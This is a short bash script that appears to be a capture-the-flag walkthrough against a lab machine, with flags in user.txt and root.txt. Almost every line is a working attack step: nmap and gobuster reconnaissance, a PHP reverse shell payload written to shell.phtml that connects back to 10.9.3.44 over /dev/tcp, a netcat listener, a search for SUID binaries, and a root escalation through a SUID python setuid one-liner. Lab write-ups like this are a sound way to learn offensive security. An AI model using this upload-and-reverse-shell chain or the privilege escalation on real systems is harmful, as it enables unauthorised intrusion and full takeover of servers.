#!/bin/bash
# Nmap Scan
nmap -sC -sV -oN nmap_initial.txt 10.10.230.182

# Gobuster Enumeration
gobuster dir -u http://10.10.230.182 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html

# Reverse Shell Payload (to save as shell.phtml)
echo "<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/10.9.3.44/4444 0>&1'\"); ?>" > shell.phtml

# Start Netcat Listener
nc -lvnp 4444

# (Manual Step) Trigger Uploaded Shell in browser:
# http://10.10.230.182/uploads/shell.phtml

# Read user.txt
cat /var/www/user.txt

# Find SUID Files
find / -user root -perm -4000 -exec ls -l {} \; 2>/dev/null | grep python

# Exploit SUID Python
/usr/bin/python -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Verify Root
whoami

# Read root.txt
cat /root/root.txt
